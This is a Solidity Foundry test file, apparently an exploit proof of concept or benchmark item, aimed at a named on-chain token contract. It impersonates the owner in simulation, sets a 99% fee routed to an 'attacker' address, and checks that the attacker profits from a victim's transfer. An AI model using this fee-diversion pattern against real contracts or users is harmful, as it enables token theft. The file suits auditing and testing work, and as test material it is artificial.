// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function balanceOf(address _owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external returns (bool);
    function mint(address account, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner
        address owner = CoinToken(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Original Owner");
        vm.label(TARGET, "Token Contract");
        vm.label(attacker, "Attacker");

        // Give attacker some initial tokens to demonstrate the exploit
        // We'll mint some to attacker first (as owner)
        vm.startPrank(owner);
        CoinToken(TARGET).mint(attacker, 1000 * 10**18);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        // Step 1: Get the current owner
        address owner = CoinToken(TARGET).owner();

        // Step 2: Impersonate owner and set high fee to attacker address
        vm.startPrank(owner);
        CoinToken(TARGET).updateFee(99, 0, attacker); // 99% fee, no burn, fees go to attacker
        vm.stopPrank();

        // Step 3: Create a victim with tokens
        address victim = address(0x123);
        vm.label(victim, "Victim");

        // Give victim tokens (using deal cheatcode)
        deal(TARGET, victim, 1000 * 10**18);

        // Record initial attacker balance
        uint256 attackerInitialBalance = CoinToken(TARGET).balanceOf(attacker);

        // Step 4: Make victim transfer tokens (triggering 99% fee)
        // Need to impersonate victim to make the transfer
        vm.prank(victim);
        CoinToken(TARGET).transfer(address(0x456), 100 * 10**18); // Transfer 100 tokens

        // Step 5: Check attacker's balance increased
        uint256 attackerFinalBalance = CoinToken(TARGET).balanceOf(attacker);
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase from fees");

        // Additional verification: Calculate expected fee
        // 99% of 100 tokens = 99 tokens should go to FeeAddress (attacker)
        // Note: Some rounding may occur due to integer division
        uint256 expectedIncrease = (100 * 10**18) * 99 / 100;
        assertGt(attackerFinalBalance - attackerInitialBalance, expectedIncrease * 90 / 100, "Should receive most of the fee");
        uint256 finalBalance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
